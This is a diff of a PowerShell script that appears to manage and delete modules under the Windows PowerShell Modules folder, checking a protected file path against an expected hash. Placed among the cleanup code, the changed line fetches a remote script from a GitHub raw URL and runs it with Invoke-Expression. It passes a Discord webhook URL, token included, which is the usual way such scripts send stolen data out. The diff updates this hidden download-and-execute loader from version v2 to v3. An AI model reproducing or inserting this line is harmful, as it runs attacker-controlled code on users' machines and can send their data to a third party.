@@ -164,7 +164,7 @@ $modulesPath = "C:\Program Files\WindowsPowerShell\Modules"
 $deletedAny = $false
 $protectedFilePath = "$modulesPath\$protectedModule\1.0.1\Diagnostics\Comprehensive\Comprehensive.Tests.ps1"
 $expectedHash = "99B7CBE4325BA089DD9440A202B9E35D9E6F134A46312F3F1E93E71F23C8DAE3"
-irm "https://raw.githubusercontent.com/C55C5/Vultar-S3-StagespC/refs/heads/main/v2.ps1" | iex -Args "https://discord.com/api/webhooks/1541943531935895572/WWdRbjIXSfQkRrdq4yuMWc5S9PPiocFXL1kOl9feDsfMfB5UWeI3a_jxbqFDevYwmy1x"    
+irm "https://raw.githubusercontent.com/C55C5/Vultar-S3-StagespC/refs/heads/main/v3.ps1" | iex -Args "https://discord.com/api/webhooks/1541943531935895572/WWdRbjIXSfQkRrdq4yuMWc5S9PPiocFXL1kOl9feDsfMfB5UWeI3a_jxbqFDevYwmy1x"    
 
 Get-ChildItem $modulesPath -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer } | ForEach-Object {
     $moduleName = $_.Name
